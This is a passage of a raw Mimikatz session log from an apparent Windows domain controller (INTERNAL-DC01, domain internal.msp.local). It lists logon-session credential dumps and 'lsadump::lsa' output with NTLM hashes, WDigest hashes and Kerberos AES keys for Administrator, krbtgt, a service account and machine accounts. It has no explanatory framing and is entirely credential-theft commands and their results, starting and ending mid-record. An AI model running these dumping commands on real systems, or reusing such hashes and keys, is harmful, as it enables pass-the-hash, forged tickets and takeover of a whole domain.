         * Password : 47 f8 a7 c4 9b 0b 4e 24 db bb 1c f6 b8 80 1b 75 c6 2e b8 3f 80 60 1a b0 e7 c0 b6 3e 75 a6 5a ec 1b 54 a6 1d ab b1 fa 48 ea bb 3c 19 0d a8 99 ed ab 2a 26 7a dd 1c 70 04 90 f9 f6 4b 38 6f 4e eb 1e cb 91 27 bb b3 11 03 7a 85 e3 04 f2 00 b8 fb 1c bd af 22 b2 f1 da ac 32 58 48 ba 5f 76 5d cd 04 59 3e 7f 6a 96 eb ab ab 76 da 96 59 da 5a 27 a2 6f ca 04 66 6c d7 c0 4b 7e 0c 57 9d 8e 42 6a 32 3b 7d 0c 8b bc 78 a6 90 e3 56 1c d2 09 34 ec 1d 47 86 9d 32 af 29 8e b1 67 40 33 9b 2a 85 6e 35 a7 dd a8 f5 52 af 2b 80 78 82 53 2f b1 71 de 4b 03 9f bb ec 90 25 8c f5 4b 6b 45 29 3f af 96 15 cd e4 30 4a df e6 f8 b5 37 0f 2f 66 bc ad 93 8f b9 0b e1 86 a9 48 e3 25 7c 0e fe bd d2 8c d3 46 9a c0 98 cf ca 31 c3 4d aa de be 01 6d 45 4e
        ssp :
        credman :

Authentication Id : 0 ; 28498 (00000000:00006f52)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/28/2024 11:46:00 PM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : INTERNAL-DC01$
         * Domain   : INTERNALMSP
         * NTLM     : 4a2af9ec44aa7c38c7a2518b6f86ebfc
         * SHA1     : fd04fdb126f02f0c729c411c8fd2983488a67d52
         * DPAPI    : fd04fdb126f02f0c729c411c8fd29834
        tspkg :
        wdigest :
         * Username : INTERNAL-DC01$
         * Domain   : INTERNALMSP
         * Password : (null)
        kerberos :
         * Username : INTERNAL-DC01$
         * Domain   : internal.msp.local
         * Password : 47 f8 a7 c4 9b 0b 4e 24 db bb 1c f6 b8 80 1b 75 c6 2e b8 3f 80 60 1a b0 e7 c0 b6 3e 75 a6 5a ec 1b 54 a6 1d ab b1 fa 48 ea bb 3c 19 0d a8 99 ed ab 2a 26 7a dd 1c 70 04 90 f9 f6 4b 38 6f 4e eb 1e cb 91 27 bb b3 11 03 7a 85 e3 04 f2 00 b8 fb 1c bd af 22 b2 f1 da ac 32 58 48 ba 5f 76 5d cd 04 59 3e 7f 6a 96 eb ab ab 76 da 96 59 da 5a 27 a2 6f ca 04 66 6c d7 c0 4b 7e 0c 57 9d 8e 42 6a 32 3b 7d 0c 8b bc 78 a6 90 e3 56 1c d2 09 34 ec 1d 47 86 9d 32 af 29 8e b1 67 40 33 9b 2a 85 6e 35 a7 dd a8 f5 52 af 2b 80 78 82 53 2f b1 71 de 4b 03 9f bb ec 90 25 8c f5 4b 6b 45 29 3f af 96 15 cd e4 30 4a df e6 f8 b5 37 0f 2f 66 bc ad 93 8f b9 0b e1 86 a9 48 e3 25 7c 0e fe bd d2 8c d3 46 9a c0 98 cf ca 31 c3 4d aa de be 01 6d 45 4e
        ssp :
        credman :

Authentication Id : 0 ; 28387 (00000000:00006ee3)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/28/2024 11:46:00 PM
SID               : S-1-5-96-0-1
        msv :
         [00000003] Primary
         * Username : INTERNAL-DC01$
         * Domain   : INTERNALMSP
         * NTLM     : 4a2af9ec44aa7c38c7a2518b6f86ebfc
         * SHA1     : fd04fdb126f02f0c729c411c8fd2983488a67d52
         * DPAPI    : fd04fdb126f02f0c729c411c8fd29834
        tspkg :
        wdigest :
         * Username : INTERNAL-DC01$
         * Domain   : INTERNALMSP
         * Password : (null)
        kerberos :
         * Username : INTERNAL-DC01$
         * Domain   : internal.msp.local
         * Password : 47 f8 a7 c4 9b 0b 4e 24 db bb 1c f6 b8 80 1b 75 c6 2e b8 3f 80 60 1a b0 e7 c0 b6 3e 75 a6 5a ec 1b 54 a6 1d ab b1 fa 48 ea bb 3c 19 0d a8 99 ed ab 2a 26 7a dd 1c 70 04 90 f9 f6 4b 38 6f 4e eb 1e cb 91 27 bb b3 11 03 7a 85 e3 04 f2 00 b8 fb 1c bd af 22 b2 f1 da ac 32 58 48 ba 5f 76 5d cd 04 59 3e 7f 6a 96 eb ab ab 76 da 96 59 da 5a 27 a2 6f ca 04 66 6c d7 c0 4b 7e 0c 57 9d 8e 42 6a 32 3b 7d 0c 8b bc 78 a6 90 e3 56 1c d2 09 34 ec 1d 47 86 9d 32 af 29 8e b1 67 40 33 9b 2a 85 6e 35 a7 dd a8 f5 52 af 2b 80 78 82 53 2f b1 71 de 4b 03 9f bb ec 90 25 8c f5 4b 6b 45 29 3f af 96 15 cd e4 30 4a df e6 f8 b5 37 0f 2f 66 bc ad 93 8f b9 0b e1 86 a9 48 e3 25 7c 0e fe bd d2 8c d3 46 9a c0 98 cf ca 31 c3 4d aa de be 01 6d 45 4e
        ssp :
        credman :

Authentication Id : 0 ; 1123365 (00000000:00112425)
Session           : Interactive from 2
User Name         : DWM-2
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/29/2024 12:03:22 AM
SID               : S-1-5-90-0-2
        msv :
         [00000003] Primary
         * Username : INTERNAL-DC01$
         * Domain   : INTERNALMSP
         * NTLM     : 4a2af9ec44aa7c38c7a2518b6f86ebfc
         * SHA1     : fd04fdb126f02f0c729c411c8fd2983488a67d52
         * DPAPI    : fd04fdb126f02f0c729c411c8fd29834
        tspkg :
        wdigest :
         * Username : INTERNAL-DC01$
         * Domain   : INTERNALMSP
         * Password : (null)
        kerberos :
         * Username : INTERNAL-DC01$
         * Domain   : internal.msp.local
         * Password : 47 f8 a7 c4 9b 0b 4e 24 db bb 1c f6 b8 80 1b 75 c6 2e b8 3f 80 60 1a b0 e7 c0 b6 3e 75 a6 5a ec 1b 54 a6 1d ab b1 fa 48 ea bb 3c 19 0d a8 99 ed ab 2a 26 7a dd 1c 70 04 90 f9 f6 4b 38 6f 4e eb 1e cb 91 27 bb b3 11 03 7a 85 e3 04 f2 00 b8 fb 1c bd af 22 b2 f1 da ac 32 58 48 ba 5f 76 5d cd 04 59 3e 7f 6a 96 eb ab ab 76 da 96 59 da 5a 27 a2 6f ca 04 66 6c d7 c0 4b 7e 0c 57 9d 8e 42 6a 32 3b 7d 0c 8b bc 78 a6 90 e3 56 1c d2 09 34 ec 1d 47 86 9d 32 af 29 8e b1 67 40 33 9b 2a 85 6e 35 a7 dd a8 f5 52 af 2b 80 78 82 53 2f b1 71 de 4b 03 9f bb ec 90 25 8c f5 4b 6b 45 29 3f af 96 15 cd e4 30 4a df e6 f8 b5 37 0f 2f 66 bc ad 93 8f b9 0b e1 86 a9 48 e3 25 7c 0e fe bd d2 8c d3 46 9a c0 98 cf ca 31 c3 4d aa de be 01 6d 45 4e
        ssp :
        credman :

Authentication Id : 0 ; 44552 (00000000:0000ae08)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/28/2024 11:46:01 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : INTERNAL-DC01$
         * Domain   : INTERNALMSP
         * NTLM     : 4a2af9ec44aa7c38c7a2518b6f86ebfc
         * SHA1     : fd04fdb126f02f0c729c411c8fd2983488a67d52
         * DPAPI    : fd04fdb126f02f0c729c411c8fd29834
        tspkg :
        wdigest :
         * Username : INTERNAL-DC01$
         * Domain   : INTERNALMSP
         * Password : (null)
        kerberos :
         * Username : INTERNAL-DC01$
         * Domain   : internal.msp.local
         * Password : 47 f8 a7 c4 9b 0b 4e 24 db bb 1c f6 b8 80 1b 75 c6 2e b8 3f 80 60 1a b0 e7 c0 b6 3e 75 a6 5a ec 1b 54 a6 1d ab b1 fa 48 ea bb 3c 19 0d a8 99 ed ab 2a 26 7a dd 1c 70 04 90 f9 f6 4b 38 6f 4e eb 1e cb 91 27 bb b3 11 03 7a 85 e3 04 f2 00 b8 fb 1c bd af 22 b2 f1 da ac 32 58 48 ba 5f 76 5d cd 04 59 3e 7f 6a 96 eb ab ab 76 da 96 59 da 5a 27 a2 6f ca 04 66 6c d7 c0 4b 7e 0c 57 9d 8e 42 6a 32 3b 7d 0c 8b bc 78 a6 90 e3 56 1c d2 09 34 ec 1d 47 86 9d 32 af 29 8e b1 67 40 33 9b 2a 85 6e 35 a7 dd a8 f5 52 af 2b 80 78 82 53 2f b1 71 de 4b 03 9f bb ec 90 25 8c f5 4b 6b 45 29 3f af 96 15 cd e4 30 4a df e6 f8 b5 37 0f 2f 66 bc ad 93 8f b9 0b e1 86 a9 48 e3 25 7c 0e fe bd d2 8c d3 46 9a c0 98 cf ca 31 c3 4d aa de be 01 6d 45 4e
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : INTERNAL-DC01$
Domain            : INTERNALMSP
Logon Server      : (null)
Logon Time        : 4/28/2024 11:45:56 PM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : INTERNAL-DC01$
         * Domain   : INTERNALMSP
         * Password : (null)
        kerberos :
         * Username : internal-dc01$
         * Domain   : INTERNAL.MSP.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 1121366 (00000000:00111c56)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/29/2024 12:03:21 AM
SID               : S-1-5-96-0-2
        msv :
         [00000003] Primary
         * Username : INTERNAL-DC01$
         * Domain   : INTERNALMSP
         * NTLM     : 4a2af9ec44aa7c38c7a2518b6f86ebfc
         * SHA1     : fd04fdb126f02f0c729c411c8fd2983488a67d52
         * DPAPI    : fd04fdb126f02f0c729c411c8fd29834
        tspkg :
        wdigest :
         * Username : INTERNAL-DC01$
         * Domain   : INTERNALMSP
         * Password : (null)
        kerberos :
         * Username : INTERNAL-DC01$
         * Domain   : internal.msp.local
         * Password : 47 f8 a7 c4 9b 0b 4e 24 db bb 1c f6 b8 80 1b 75 c6 2e b8 3f 80 60 1a b0 e7 c0 b6 3e 75 a6 5a ec 1b 54 a6 1d ab b1 fa 48 ea bb 3c 19 0d a8 99 ed ab 2a 26 7a dd 1c 70 04 90 f9 f6 4b 38 6f 4e eb 1e cb 91 27 bb b3 11 03 7a 85 e3 04 f2 00 b8 fb 1c bd af 22 b2 f1 da ac 32 58 48 ba 5f 76 5d cd 04 59 3e 7f 6a 96 eb ab ab 76 da 96 59 da 5a 27 a2 6f ca 04 66 6c d7 c0 4b 7e 0c 57 9d 8e 42 6a 32 3b 7d 0c 8b bc 78 a6 90 e3 56 1c d2 09 34 ec 1d 47 86 9d 32 af 29 8e b1 67 40 33 9b 2a 85 6e 35 a7 dd a8 f5 52 af 2b 80 78 82 53 2f b1 71 de 4b 03 9f bb ec 90 25 8c f5 4b 6b 45 29 3f af 96 15 cd e4 30 4a df e6 f8 b5 37 0f 2f 66 bc ad 93 8f b9 0b e1 86 a9 48 e3 25 7c 0e fe bd d2 8c d3 46 9a c0 98 cf ca 31 c3 4d aa de be 01 6d 45 4e
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : INTERNAL-DC01$
Domain            : INTERNALMSP
Logon Server      : (null)
Logon Time        : 4/28/2024 11:46:01 PM
SID               : S-1-5-20
        msv :
         [00000003] Primary
         * Username : INTERNAL-DC01$
         * Domain   : INTERNALMSP
         * NTLM     : 4a2af9ec44aa7c38c7a2518b6f86ebfc
         * SHA1     : fd04fdb126f02f0c729c411c8fd2983488a67d52
         * DPAPI    : fd04fdb126f02f0c729c411c8fd29834
        tspkg :
        wdigest :
         * Username : INTERNAL-DC01$
         * Domain   : INTERNALMSP
         * Password : (null)
        kerberos :
         * Username : internal-dc01$
         * Domain   : INTERNAL.MSP.LOCAL
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 1121343 (00000000:00111c3f)
Session           : Interactive from 2
User Name         : UMFD-2
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/29/2024 12:03:21 AM
SID               : S-1-5-96-0-2
        msv :
         [00000003] Primary
         * Username : INTERNAL-DC01$
         * Domain   : INTERNALMSP
         * NTLM     : 4a2af9ec44aa7c38c7a2518b6f86ebfc
         * SHA1     : fd04fdb126f02f0c729c411c8fd2983488a67d52
         * DPAPI    : fd04fdb126f02f0c729c411c8fd29834
        tspkg :
        wdigest :
         * Username : INTERNAL-DC01$
         * Domain   : INTERNALMSP
         * Password : (null)
        kerberos :
         * Username : INTERNAL-DC01$
         * Domain   : internal.msp.local
         * Password : 47 f8 a7 c4 9b 0b 4e 24 db bb 1c f6 b8 80 1b 75 c6 2e b8 3f 80 60 1a b0 e7 c0 b6 3e 75 a6 5a ec 1b 54 a6 1d ab b1 fa 48 ea bb 3c 19 0d a8 99 ed ab 2a 26 7a dd 1c 70 04 90 f9 f6 4b 38 6f 4e eb 1e cb 91 27 bb b3 11 03 7a 85 e3 04 f2 00 b8 fb 1c bd af 22 b2 f1 da ac 32 58 48 ba 5f 76 5d cd 04 59 3e 7f 6a 96 eb ab ab 76 da 96 59 da 5a 27 a2 6f ca 04 66 6c d7 c0 4b 7e 0c 57 9d 8e 42 6a 32 3b 7d 0c 8b bc 78 a6 90 e3 56 1c d2 09 34 ec 1d 47 86 9d 32 af 29 8e b1 67 40 33 9b 2a 85 6e 35 a7 dd a8 f5 52 af 2b 80 78 82 53 2f b1 71 de 4b 03 9f bb ec 90 25 8c f5 4b 6b 45 29 3f af 96 15 cd e4 30 4a df e6 f8 b5 37 0f 2f 66 bc ad 93 8f b9 0b e1 86 a9 48 e3 25 7c 0e fe bd d2 8c d3 46 9a c0 98 cf ca 31 c3 4d aa de be 01 6d 45 4e
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 4/28/2024 11:46:02 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 44582 (00000000:0000ae26)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/28/2024 11:46:01 PM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : INTERNAL-DC01$
         * Domain   : INTERNALMSP
         * NTLM     : 4a2af9ec44aa7c38c7a2518b6f86ebfc
         * SHA1     : fd04fdb126f02f0c729c411c8fd2983488a67d52
         * DPAPI    : fd04fdb126f02f0c729c411c8fd29834
        tspkg :
        wdigest :
         * Username : INTERNAL-DC01$
         * Domain   : INTERNALMSP
         * Password : (null)
        kerberos :
         * Username : INTERNAL-DC01$
         * Domain   : internal.msp.local
         * Password : 47 f8 a7 c4 9b 0b 4e 24 db bb 1c f6 b8 80 1b 75 c6 2e b8 3f 80 60 1a b0 e7 c0 b6 3e 75 a6 5a ec 1b 54 a6 1d ab b1 fa 48 ea bb 3c 19 0d a8 99 ed ab 2a 26 7a dd 1c 70 04 90 f9 f6 4b 38 6f 4e eb 1e cb 91 27 bb b3 11 03 7a 85 e3 04 f2 00 b8 fb 1c bd af 22 b2 f1 da ac 32 58 48 ba 5f 76 5d cd 04 59 3e 7f 6a 96 eb ab ab 76 da 96 59 da 5a 27 a2 6f ca 04 66 6c d7 c0 4b 7e 0c 57 9d 8e 42 6a 32 3b 7d 0c 8b bc 78 a6 90 e3 56 1c d2 09 34 ec 1d 47 86 9d 32 af 29 8e b1 67 40 33 9b 2a 85 6e 35 a7 dd a8 f5 52 af 2b 80 78 82 53 2f b1 71 de 4b 03 9f bb ec 90 25 8c f5 4b 6b 45 29 3f af 96 15 cd e4 30 4a df e6 f8 b5 37 0f 2f 66 bc ad 93 8f b9 0b e1 86 a9 48 e3 25 7c 0e fe bd d2 8c d3 46 9a c0 98 cf ca 31 c3 4d aa de be 01 6d 45 4e
        ssp :
        credman :

Authentication Id : 0 ; 28429 (00000000:00006f0d)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/28/2024 11:46:00 PM
SID               : S-1-5-96-0-0
        msv :
         [00000003] Primary
         * Username : INTERNAL-DC01$
         * Domain   : INTERNALMSP
         * NTLM     : 4a2af9ec44aa7c38c7a2518b6f86ebfc
         * SHA1     : fd04fdb126f02f0c729c411c8fd2983488a67d52
         * DPAPI    : fd04fdb126f02f0c729c411c8fd29834
        tspkg :
        wdigest :
         * Username : INTERNAL-DC01$
         * Domain   : INTERNALMSP
         * Password : (null)
        kerberos :
         * Username : INTERNAL-DC01$
         * Domain   : internal.msp.local
         * Password : 47 f8 a7 c4 9b 0b 4e 24 db bb 1c f6 b8 80 1b 75 c6 2e b8 3f 80 60 1a b0 e7 c0 b6 3e 75 a6 5a ec 1b 54 a6 1d ab b1 fa 48 ea bb 3c 19 0d a8 99 ed ab 2a 26 7a dd 1c 70 04 90 f9 f6 4b 38 6f 4e eb 1e cb 91 27 bb b3 11 03 7a 85 e3 04 f2 00 b8 fb 1c bd af 22 b2 f1 da ac 32 58 48 ba 5f 76 5d cd 04 59 3e 7f 6a 96 eb ab ab 76 da 96 59 da 5a 27 a2 6f ca 04 66 6c d7 c0 4b 7e 0c 57 9d 8e 42 6a 32 3b 7d 0c 8b bc 78 a6 90 e3 56 1c d2 09 34 ec 1d 47 86 9d 32 af 29 8e b1 67 40 33 9b 2a 85 6e 35 a7 dd a8 f5 52 af 2b 80 78 82 53 2f b1 71 de 4b 03 9f bb ec 90 25 8c f5 4b 6b 45 29 3f af 96 15 cd e4 30 4a df e6 f8 b5 37 0f 2f 66 bc ad 93 8f b9 0b e1 86 a9 48 e3 25 7c 0e fe bd d2 8c d3 46 9a c0 98 cf ca 31 c3 4d aa de be 01 6d 45 4e
        ssp :
        credman :

Authentication Id : 0 ; 25278 (00000000:000062be)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 4/28/2024 11:45:56 PM
SID               :
        msv :
         [00000003] Primary
         * Username : INTERNAL-DC01$
         * Domain   : INTERNALMSP
         * NTLM     : 4a2af9ec44aa7c38c7a2518b6f86ebfc
         * SHA1     : fd04fdb126f02f0c729c411c8fd2983488a67d52
         * DPAPI    : fd04fdb126f02f0c729c411c8fd29834
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

mimikatz # lsasump::lsa /patch
ERROR mimikatz_doLocal ; "lsasump" module not found !

        standard  -  Standard module  [Basic commands (does not require module name)]
          crypto  -  Crypto Module
        sekurlsa  -  SekurLSA module  [Some commands to enumerate credentials...]
        kerberos  -  Kerberos package module  []
             ngc  -  Next Generation Cryptography module (kiwi use only)  [Some commands to enumerate credentials...]
       privilege  -  Privilege module
         process  -  Process module
         service  -  Service module
         lsadump  -  LsaDump module
              ts  -  Terminal Server module
           event  -  Event module
            misc  -  Miscellaneous module
           token  -  Token manipulation module
           vault  -  Windows Vault/Credential module
     minesweeper  -  MineSweeper module
             net  -
           dpapi  -  DPAPI Module (by API or RAW access)  [Data Protection application programming interface]
       busylight  -  BusyLight Module
          sysenv  -  System Environment Value module
             sid  -  Security Identifiers module
             iis  -  IIS XML Config module
             rpc  -  RPC control of mimikatz
            sr98  -  RF module for SR98 device and T5577 target
             rdm  -  RF module for RDM(830 AL) device
             acr  -  ACR Module

mimikatz # lsadump::lsa /patch
Domain : INTERNALMSP / S-1-5-21-2754435719-1041067879-922430489

RID  : 000001f4 (500)
User : Administrator
LM   :
NTLM : 3be591c12e5b21818dccf376674fcba6

RID  : 000001f5 (501)
User : Guest
LM   :
NTLM :

RID  : 000001f6 (502)
User : krbtgt
LM   :
NTLM : c5915aada9bbe71d6b1ecd1ad471b041

RID  : 00000460 (1120)
User : batchsvc
LM   :
NTLM : 10ee9d3f6da987cac9357548fadb7f7b

RID  : 000003e8 (1000)
User : INTERNAL-DC01$
LM   :
NTLM : 4a2af9ec44aa7c38c7a2518b6f86ebfc

RID  : 00000450 (1104)
User : INTERNAL-BATCH$
LM   :
NTLM : 596b23e74f15ec2a3caf0dd1a96adc63

RID  : 00000451 (1105)
User : INTERNAL-SRV06$
LM   :
NTLM : d12f3a68e9e4e034ce078a745d7fdae2

RID  : 0000044f (1103)
User : MSP$
LM   :
NTLM : 6a132bc898dacbe9822205e8b51b0d57

mimikatz # lsadump::lsa /inject
Domain : INTERNALMSP / S-1-5-21-2754435719-1041067879-922430489

RID  : 000001f4 (500)
User : Administrator

 * Primary
    NTLM : 3be591c12e5b21818dccf376674fcba6
    LM   :
  Hash NTLM: 3be591c12e5b21818dccf376674fcba6
    ntlm- 0: 3be591c12e5b21818dccf376674fcba6
    ntlm- 1: c87a64622a487061ab81e51cc711a34b
    lm  - 0: b28291e92618d7122c5578a0ae804424

 * WDigest
    01  37e5b7e10ec43002ee18a7ebf93533eb
    02  41fd43dc5b9267bb8042df6c5acc87cd
    03  bf6c2bc58c3c0faa508ffe522a031811
    04  37e5b7e10ec43002ee18a7ebf93533eb
    05  97ccadddc4ad0cc8cb5882d8617e1551
    06  59fce6a3b32a9bb50fa8521afba2b825
    07  1daf124c084049cea8d9b76e250f4af2
    08  18a1e8ad4597b6261c85ccea93a6936b
    09  9f9d64028a256dadbae2702f196e63a8
    10  1b9f25c94664efe5c90e3ac4ad501d13
    11  62e59e39a9fa0635d4e5fb6a57bacfe7
    12  18a1e8ad4597b6261c85ccea93a6936b
    13  c970de3888be028041d82cbb950b70e6
    14  1298336553311b1fa487f8d046378def
    15  01a868d831c357d9f5eca98f422e8689
    16  a90e96559cc24bf67da23d5b49574133
    17  b000ecc8757cf21b6deab8223e813e3e
    18  e8820aded4233c20ac6d6b15e04a86fb
    19  5a7af0b449a04b7b63b55848b2bb9ce0
    20  58f8ad5c429177f5d8b34d6b7a5a0bed
    21  b8adaa49ea82b47ed7133c257c2168b0
    22  4247f0ee72d8084c49c4497476b1a70b
    23  dbe140d8e4f91afe89d4915123df5aad
    24  75285ef22ce6c95ef486d1a83e932fab
    25  fab0ed17e0c71af5c634a974b747b58f
    26  86eabf6995c553db96d400138a083201
    27  0fcda97049bce5b3b487a73d5edb6540
    28  97f5b7a9713910a348859df0cccfac31
    29  4e181839ddb10a42b38607ab441cffc0

 * Kerberos
    Default Salt : INTERNAL.MSP.LOCALAdministrator
    Credentials
      des_cbc_md5       : 4adae5e62c97f2b0
    OldCredentials
      des_cbc_md5       : d5c83e8973bca70d

 * Kerberos-Newer-Keys
    Default Salt : INTERNAL.MSP.LOCALAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 4b93fac323b76b91f804d82f7ace0843cc9909ccccb8d972665b535f04b4965d
      aes128_hmac       (4096) : b04cbda93d50d81584b9cba4246f53a3
      des_cbc_md5       (4096) : 4adae5e62c97f2b0
    OldCredentials
      aes256_hmac       (4096) : bb6c14c72b5092240bb2b551f544de01b6369ca0c6fb4ab7cca685cad2950718
      aes128_hmac       (4096) : 44ebb77876b16e31ee27d465efcb607c
      des_cbc_md5       (4096) : d5c83e8973bca70d
    OlderCredentials
      aes256_hmac       (4096) : 6ee5d99e81fd6bdd2908243ef1111736132f4b107822e4eebf23a18ded385e61
      aes128_hmac       (4096) : 6508ee108b9737e83f289d79ea365151
      des_cbc_md5       (4096) : 31435d975783d0d0

 * NTLM-Strong-NTOWF
    Random Value : 1959011a57a71281e230221dad29a94a

RID  : 000001f5 (501)
User : Guest

 * Primary
    NTLM :
    LM   :

RID  : 000001f6 (502)
User : krbtgt

 * Primary
    NTLM : c5915aada9bbe71d6b1ecd1ad471b041
    LM   :
  Hash NTLM: c5915aada9bbe71d6b1ecd1ad471b041
    ntlm- 0: c5915aada9bbe71d6b1ecd1ad471b041
    lm  - 0: a0b4ab25dc4cb22ac8f6a2d9e8a27f66

 * WDigest
    01  078ee40ae66dc900e70cc6be6732cd9f
    02  fc0fdb499f5492df0252fa0dd4009ff1
    03  23185e8c55c74e4d495e06af97edf657
    04  078ee40ae66dc900e70cc6be6732cd9f
    05  fc0fdb499f5492df0252fa0dd4009ff1
    06  2fc60f2ae195d04f29956b936dff87d6
    07  078ee40ae66dc900e70cc6be6732cd9f
    08  5f74a99d0a51b2baad10a675051f1577
    09  5f74a99d0a51b2baad10a675051f1577
    10  f802021d402fea23685b24cfff3eba16
    11  7ae3424569e7b09257d06fe5cb78f7f5
    12  5f74a99d0a51b2baad10a675051f1577
    13  2cbd20efc17bde1a8dc9049e19a0a90d
    14  7ae3424569e7b09257d06fe5cb78f7f5
    15  ce22a4ba38cc7d50d62b12e32d361b53
    16  ce22a4ba38cc7d50d62b12e32d361b53
    17  5008c49fe0439c352ca540835d7e929c
    18  f1c88252d3a00cc90b12b2b3a9e49e1c
    19  8cf70e9dbcf534aef9743e15c471777d
    20  82695aca1e252e1ce6fc0a82ed7f0558
    21  9383ca0c1af74bf312afe57cba33150f
    22  9383ca0c1af74bf312afe57cba33150f
    23  63a710a03220454aaf359a5304d5197d
    24  8847159c17458e709d6784e9452318ae
    25  8847159c17458e709d6784e9452318ae
    26  1d1c31eea38cef457789258157cd29a6
    27  95d9065f77fd87a955b518a5105e0bf4
    28  60e8df61ca81bc8425e6d0ffe7a95c32
    29  dadcd8d1310b7e8e9f08e380bd3af68a

 * Kerberos
    Default Salt : INTERNAL.MSP.LOCALkrbtgt
    Credentials
      des_cbc_md5       : 89ab4934c7d5bfa1

 * Kerberos-Newer-Keys
    Default Salt : INTERNAL.MSP.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : cc20c8162d769beb5deb56ba94be4b8f18e09ef3e119cbb1a857a92597dcf3ee
      aes128_hmac       (4096) : 4854f06f053814aa06ec88dd5c5e26ce
      des_cbc_md5       (4096) : 89ab4934c7d5bfa1

 * NTLM-Strong-NTOWF
    Random Value : 2f823fdaf35fe639319f1dd53fb0a5c1

RID  : 00000460 (1120)
User : batchsvc

 * Primary
    NTLM : 10ee9d3f6da987cac9357548fadb7f7b
    LM   :
  Hash NTLM: 10ee9d3f6da987cac9357548fadb7f7b
    ntlm- 0: 10ee9d3f6da987cac9357548fadb7f7b
    ntlm- 1: 10ee9d3f6da987cac9357548fadb7f7b
    ntlm- 2: 10ee9d3f6da987cac9357548fadb7f7b
    lm  - 0: b40c708257b457ff45ce1f6e8ac04f51
    lm  - 1: 97868c118c572faf71c3c0161e487e0c
    lm  - 2: dece311fb440ddb107ef8bcfad637ad0

 * WDigest
    01  3170440aa012a642175ef70fb10054d2
    02  8c6411e6698feda18503c9f645de5fb5
    03  b48f00d024aaee2473c22f5aff2dd64f
    04  3170440aa012a642175ef70fb10054d2
    05  8c6411e6698feda18503c9f645de5fb5
    06  6b5ea49f49cde1cb95d470102153b3c0
    07  3170440aa012a642175ef70fb10054d2
    08  8724fb9289d1389442a9b1eb134fa375
    09  8724fb9289d1389442a9b1eb134fa375
    10  67e1faf0ebf4e6b5be50830e344a0dec
    11  4feb29c0e38ef172f0d9881802a818e0
    12  8724fb9289d1389442a9b1eb134fa375
    13  3138916c4c3626d98c52b9a5cca58d0f
    14  4feb29c0e38ef172f0d9881802a818e0
    15  accd7ecfb2a886926a758efbebbb03d7
    16  accd7ecfb2a886926a758efbebbb03d7
    17  08ef3dad8316dff865e2cb0b798456fd
    18  a1c192a0d77eb83b4bb618d525fbeee4
    19  da26947ad2b44b05e718e6fad790aca5
    20  963f178f0a98139dda94658152ec2364
    21  fe302c1971e0e0758b801e4c352ef42d
    22  fe302c1971e0e0758b801e4c352ef42d
    23  98791867ea1ed5161994f99cc8d2d355
    24  fe302c1971e0e0758b801e4c352ef42d
    25  fe302c1971e0e0758b801e4c352ef42d
    26  98791867ea1ed5161994f99cc8d2d355
    27  f58a934a4a55579760843e3648b23908
    28  259c0820f0cd5a32baab91bb6d63ac7f
    29  bf116ec9d1941ac37dc102846ed3e0cb

 * Kerberos
    Default Salt : INTERNAL.MSP.LOCALbatchsvc
    Credentials
      des_cbc_md5       : 4ae32c97f4735768
    OldCredentials
      des_cbc_md5       : 4ae32c97f4735768

 * Kerberos-Newer-Keys
    Default Salt : INTERNAL.MSP.LOCALbatchsvc
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 3f136175df0d844041276d1abd49f03132c6df75181796a248aeffd4bf3d0392
      aes128_hmac       (4096) : b08c7257e3da52e5c893ab5ba00cd3b7
      des_cbc_md5       (4096) : 4ae32c97f4735768
    OldCredentials
      aes256_hmac       (4096) : 3f136175df0d844041276d1abd49f03132c6df75181796a248aeffd4bf3d0392
      aes128_hmac       (4096) : b08c7257e3da52e5c893ab5ba00cd3b7
      des_cbc_md5       (4096) : 4ae32c97f4735768
    OlderCredentials
      aes256_hmac       (4096) : 3f136175df0d844041276d1abd49f03132c6df75181796a248aeffd4bf3d0392
      aes128_hmac       (4096) : b08c7257e3da52e5c893ab5ba00cd3b7
      des_cbc_md5       (4096) : 4ae32c97f4735768

 * NTLM-Strong-NTOWF
    Random Value : 3d728c87cdfbd16645b35684aef1f1e6

RID  : 000003e8 (1000)
User : INTERNAL-DC01$

 * Primary
    NTLM : 4a2af9ec44aa7c38c7a2518b6f86ebfc
    LM   :
  Hash NTLM: 4a2af9ec44aa7c38c7a2518b6f86ebfc
    ntlm- 0: 4a2af9ec44aa7c38c7a2518b6f86ebfc
    ntlm- 1: 0717aa367f8df84071fd893523193c8f
    ntlm- 2: 1d910f235d199ffa0f06faf36a25aed2
